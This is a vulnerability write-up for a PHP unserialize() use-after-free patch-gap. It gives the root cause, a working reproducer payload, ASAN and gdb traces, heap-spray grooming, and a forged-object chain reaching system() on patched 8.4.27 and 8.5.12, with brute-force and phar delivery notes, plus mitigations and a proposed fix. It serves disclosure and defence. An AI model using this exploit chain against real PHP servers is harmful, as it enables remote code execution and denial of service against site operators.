# var_destroy delayed-destructor re-entry UAF (patch-gap)

> **Published 2026-10-31.** This is a **patch-gap**, not a new bug. The
> delayed-destructor re-entry UAF was published on 2026-05-02 by **dinosn**
> (`github.com/dinosn/php-8.5.5-var_destroy-uaf`) and is a sister finding to
> **Calif.io**'s MAD Bugs (2026-05-01). PHP's policy since August 2017 has been
> not to issue CVEs for `unserialize()` memory-corruption bugs, so no new CVE is
> claimed. What this document adds: confirmation that the 2026-10-21 patch does
> not close the path on 8.4.27 / 8.5.12, the controlled-dereference and
> forged-object ladder on stock ZendMM, and the measured carrier/worker
> constants.

**Status:** confirmed and **weaponized lab-only** (terminal call →
`uid=33` on stock ZendMM 8.4.26 / patched 8.4.27 / patched 8.5.12, with a
lab-assisted address; `+0x1000` bias control blocks). In-band leak open.
**Class:** heap-use-after-free (read) with a controllable wild-pointer
dereference after heap grooming.
**Reachability:** application-level — requires a loaded class whose
`__destruct()` calls `unserialize()`.

---

## 1. Root cause

`php_var_unserialize_destroy()` frees the nested `var_entries` chain in
`var_destroy()`, then walks the delayed-destructor list and calls
`i_zval_ptr_dtor(zv)` on each object **without holding `BG(serialize_lock)`**:

```c
/* ext/standard/var_unserializer.c, var_destroy() */
while (var_hash) {                 /* extension chunks */
    next = var_hash->next;
    efree_size(var_hash, sizeof(var_entries));
    var_hash = next;
}

while (var_dtor_hash) {
    for (i = 0; i < var_dtor_hash->used_slots; i++) {
        zval *zv = &var_dtor_hash->data[i];
        /* __wakeup / __unserialize branches do BG(serialize_lock)++ ... */
        i_zval_ptr_dtor(zv);       /* <-- destructor runs UNLOCKED */
    }
    ...
}
```

The object's `__destruct()` calls `unserialize()` again. In
`php_var_unserialize_init()`:

```c
if (BG(serialize_lock) || !BG(unserialize).level) { /* fresh */ }
else { d = BG(unserialize).data; ++BG(unserialize).level; }  /* stale */
```

Because the lock is 0 and the level is still >0 (it is decremented *after*
`var_destroy()`), the nested call reuses the same `d` whose `entries.next`
chain was just freed. `php_var_unserialize()` then reads
`(*var_hash)->last->used_slots` from freed memory
(`var_unserializer.c:906`).

The delayed-destructor list is populated when a duplicate array key
overwrites an object value; `i_zval_ptr_dtor()` on that object then runs the
destructor inside the walk.

## 2. Minimal reproducer

`poc/verify_var_destroy_uaf.php` (≈6.1 KB payload):

```php
class T { public function __destruct() { @unserialize('i:0;'); } }
$p = 'a:1018:{' . str_repeat('i:0;N;', 1016)
   . 'i:99999;O:1:"T":0:{}' . 'i:99999;i:42;' . '}';
@unserialize($p);
```

Measured threshold: **1018 serialized elements** (1016 scalars + the object +
the duplicate key). Below that no `var_entries` extension chunk is freed and
the nested read is not reached (1017 elements = no ASAN report).

## 3. Evidence

ASAN (8.4.27, and identically 8.5.12):

```text
ERROR: AddressSanitizer: heap-use-after-free
READ of size 8 at ... thread T0
    #0 php_var_unserialize            ext/standard/var_unserializer.c:906
    ...
    #13 var_destroy                   ext/standard/var_unserializer.c:319
    #14 php_var_unserialize_destroy   ext/standard/var_unserializer.c:94
```

8.2.34 reports the same defect at `var_unserializer.c:850` (older line
number). The CVE-2026-109618/109619 patch does not add the lock, so 8.4.27 and
8.5.12 remain affected.

Run:

```sh
docker build --build-arg PHP_VERSION=8.4.27 -t php-asan-8427:local lab-asan-85x
docker run --rm -v "$PWD/poc:/work/poc" php-asan-8427:local \
    php /work/poc/verify_var_destroy_uaf.php
```

## 4. Production behaviour and control

On stock ZendMM the read is **silent** (no crash): the freed chunk is still
mapped and contains the old bookkeeping, and `R:<small>` resolves to a live
outer value.

With heap grooming the stale chunk is reclaimable. `poc/verify_var_destroy_spray.php`
allocates same-size strings (`8160 B` = `sizeof(var_entries)`) in `__destruct`
before the nested `unserialize('R:1019;')`. The `R:1019` index walks past the
first chunk into the freed extension, whose `used_slots` now comes from the
reclaimed bytes and whose `data[id]` is the spray bytes. On **stock 8.2.34,
8.4.27 and 8.5.12** this produces `SIGSEGV` (rc 139); without the spray the
same index returns an integer and exits 0.

**The pointer is attacker-controlled.** Running under gdb with `R:1020` and a
spray filled with `0x41`:

```text
Program received signal SIGSEGV, Segmentation fault.
$1 = 0x4141414141414149          # si_addr: [x0+8]
=> 0x...: ldrb w0, [x0, #8]      # inside php_var_unserialize
x0 = 0x4141414141414141          # the spray bytes, treated as a zval *
```

So `data[id]` is read from the reclaimed `var_entries` and dereferenced as a
`zval *` exactly as supplied. This is a **controllable wild-pointer
dereference / type-confusion entry point**, not a read-only crash.

## 4b. WordPress impact (lab)

The repo's real WordPress/FPM lab (`lab-wp-zendmm`, PHP 8.2.34) now has a
**mu-plugin harness** (`lab-wp-zendmm/uaf-harness/`) that models a
plugin-level double-unserialize bug:

- **sink** — `add_action('init', ...)` calls `unserialize(wp_unslash($_POST['d']))`;
- **gadget** — `WP_UAF_Gadget::__destruct()` does the same-size spray, then
  re-enters `unserialize('R:1020;')`.

The proof (`poc/verify_var_destroy_wp.py`) posts the 1018-element payload and
gets `502 Bad Gateway`; the FPM log shows the whole path:

```text
[UAFDBG] INIT   d=... lock=0 level=2
[UAFDBG] WRAP   d=... last=0xffff8a8b1000
[UAFDBG] WRAP2  d=... last=0xffff8a8b1000 used=94489280513
[UAFDBG] RREF   id=1019 entries=... used=1018
child 6 exited on signal 11 (SIGSEGV)
```

**What this means for WordPress:** core does not provide the re-entry gadget,
so this is **not a WP-core RCE**. It is a per-request **DoS** primitive for a
plugin that (a) unserializes user input and (b) has a destructor that
re-enters `unserialize()`; FPM respawns the child, so repeating the request
sustains the DoS. Reaching RCE still requires the address leak + forged-zval
chain in §5. `unserialize(..., ['allowed_classes' => false])` in the sink, or
auditing/removing such gadgets, blocks it.

## 5. Exploitability verdict

- **Lab-assisted RCE demonstrated (2026-10-30).** The full ladder now runs
  end-to-end on **stock ZendMM**, on the **patched 8.4.27 and 8.5.12**
  builds: forged `zval(IS_REFERENCE)` → forged `zend_reference`
  (refcount 0) → `zval(IS_OBJECT)` → forged `zend_object` that doubles as
  `zend_execute_data` → `handlers->dtor_obj = zif_system`. Dropping the
  reference runs `zend_reference_destroy` → `i_zval_ptr_dtor` →
  `zend_objects_store_del` → `zif_system(object-as-execute_data)` and the
  fixed benign command returns `uid=33`. `+0x1000` bias on `zif_system`
  blocks it. Reproduce:
  `python3 poc/verify_vardestroy_rce.py --target 127.0.0.1:18131 run`
  (`lab-pure-modphp` `pure-arm64-patched`); the 8.5.12 row is
  `pure-arm64-8512` on `:18133`.
- **Remaining gap: the address source is lab-assisted.** The forged carrier
  lives in a fixed-size `zend_string`; its address is read from
  `/proc/<pid>/mem` (the carrier address is stable across requests on the
  pinned single worker). An **in-band** leak that replaces `/proc` on a
  patched build is not yet demonstrated — until then this is a lab proof,
  not a remote-ready chain.
- **Update (2026-10-30, brute force):** on arm64 with `vm.mmap_rnd_bits=18`
  the address no longer needs a leak at all. The ZendMM main chunk has 512
  possible 2 MiB slots, stable for the Apache parent, and a wrong guess kills
  only a child, so `poc/verify_vardestroy_bruteforce.py` scans it. 8.5.12 was
  recovered in 384 attempts / 54.7 s with **no maps and no leak** → `uid=33`;
  8.4.27 scans the same way with 33 lib positions. The remaining precondition
  is the **fire sink** (an app `unserialize()` + re-entry gadget), not a leak.
  On hosts with 28-bit mmap randomization the scan is infeasible and the
  external-leak front-ends (LFI / curl-file SSRF / XXE) remain the path.
- **Carrier placement solved (2026-10-30).** The forged carrier no longer
  needs the lab `vd.php` allocation: it lives **inside the
  application-controlled POST string** (`$_POST['p']`), at a fixed offset
  (`DOFF=0x14`) after a 4096-byte serialized string value. For the fixed
  request shape on 8.4.27/aarch64, `address(value) - main = 0x72018`
  (carrier `+0x14`) and it held **6/6** on a single worker, **6/6** on the
  stock 150-worker prefork (warm, no pinning), and **6/6 after a container
  restart**. The spray token is the deserialized object's own `key` property.
  `poc/verify_vardestroy_postcarrier.py` + `poc/app_unserialize_sink.php`.
  Remaining: the **libphp base is not main-relative** (varies per instance),
  so `zif_system` needs either an independent libphp leak or the bounded
  libphp slot scan (<=256 x 64 KiB; 9 attempts in the measured case).
- **Mechanics that made the ladder work** (recorded for the next rung):
  `var_access()` returns `data[id]` (a `zval *`), so the reclaim spray's
  first 8 bytes are the pointer that gets dereferenced. Uppercase `R:` is
  required — lowercase `r:` first calls `var_push`, which writes at
  `used_slots` read from the reclaimed string header (a wild write). A
  concatenated spray filler is itself a same-size allocation and steals the
  freed `var_entries` chunk; build each spray string in place.
- **Layout correction + structural ceiling (2026-10-30, gdb on 8.4.26):**
  `struct var_entries { zend_long used_slots; void *next; zval *data[1018]; }`
  — the slots are **8-byte `zval *` slots**, not inline zvals, so `var_push`
  writes at `block + 16 + 8*used_slots` (not `16*used_slots`). `sizeof` is
  8160 (a 2-page allocation). Without a spray the freed chunk holds
  `used_slots=1`, `next=0`, `data[0]=&last_zval`, and `&last_zval` is
  **outside** the chunk (measured `-0x8fe0` from the extension block); `R:`
  returns a typed copy of that real element. Tested and falsified as an
  address-free bootstrap: relative/negative-`used_slots` writes store a real
  engine `zval *` (never attacker bytes); the store is a full 8-byte aligned
  write (no partial overwrite); `IS_INDIRECT`/`C:`/references never turn real
  pointers into attacker bytes; and a freed 2-page block can be carved into
  small-bin SRUN pages so attacker bytes sit at a runtime-known address — but
  the engine treats them as a pointer value, which is exactly the circularity.
  **The amplifier therefore still requires one external address on patched
  builds; the barrier is structural, not a grooming problem.**
- **Primitive class: controllable UAF read → forged zval pointer → forged
  reference/object → indirect `dtor_obj` call.**
- **Preconditions:** `unserialize()` reachability (app-level), a loaded class
  with a destructor that re-enters `unserialize()`, and heap grooming.
- **Alternative delivery — `phar://` metadata (2026-10-30):** the payload can
  be stored as raw phar metadata (`poc/build_uaf_phar.py`). On 8.2.35–8.5.12
  the metadata is parsed lazily, so `file_exists`/`md5_file` do **not**
  trigger it, but `Phar::getMetadata()` (without `allowed_classes => false`)
  does; the full terminal call was reproduced through it on patched 8.4.27.
  This replaces an explicit app `unserialize()` call with a `getMetadata()`
  call, across every patched branch. `allowed_classes=false` blocks it.
- **Mitigation (verified):** `unserialize($p, ['allowed_classes' => false])`
  prevents the object from materializing, so the destructor never runs — no
  ASAN report. Default (all classes) or explicitly allowing the class
  triggers the UAF. This is the primary application-level mitigation until a
  PHP fix ships.
- **Default session path:** not reachable without such a gadget; the session
  serializer's destructors do not call `unserialize()` on attacker data.

## 6. Proposed fix

Hold `BG(serialize_lock)` across the destructor invocation in
`var_destroy()` (the `__wakeup`/`__unserialize` branches already do this
around their calls, but the final `i_zval_ptr_dtor()` is outside it):

```c
BG(serialize_lock)++;
i_zval_ptr_dtor(zv);
BG(serialize_lock)--;
```

With the lock held, the nested `php_var_unserialize_init()` takes the fresh
branch and never touches the freed chain. Add a regression test that runs the
minimal payload under ASAN.

## 7. Disclosure status

1. Prior art is credited above; this document does not claim a new bug or a new
   CVE.
2. A hardening note asking for `BG(serialize_lock)` around the dtor walk plus an
   ASAN regression test is prepared but **not sent**. Nothing in this repository
   authorises a vendor contact; that is a separate decision.
3. Publication of this document and the PoCs was a deliberate decision recorded
   in `docs/RESPONSIBLE_PUBLICATION.md`. The composition and the root cause were
   already public.
4. Following the proposed lock, the same payload should be re-run under ASAN as
   a regression test.

## 8. Honest ceilings

- The lab grooming is deliberate code in the destructor; a real target needs a
  matching gadget.
- RIP control and the terminal call **are** demonstrated (see §5), but with a
  **lab-assisted** carrier address (`/proc`). The in-band leak that would make
  this remote-ready is not demonstrated. The 8.4.26/8.4.27/8.5.12 `uid=33`
  proofs are lab results, not a remote exploit.
- The forged carrier must be placed at a known address; on the pinned worker
  that address is stable across requests, but a target without a leak cannot
  reproduce it yet.
- All work is lab-only; the repo's fixed benign-command policy still applies.
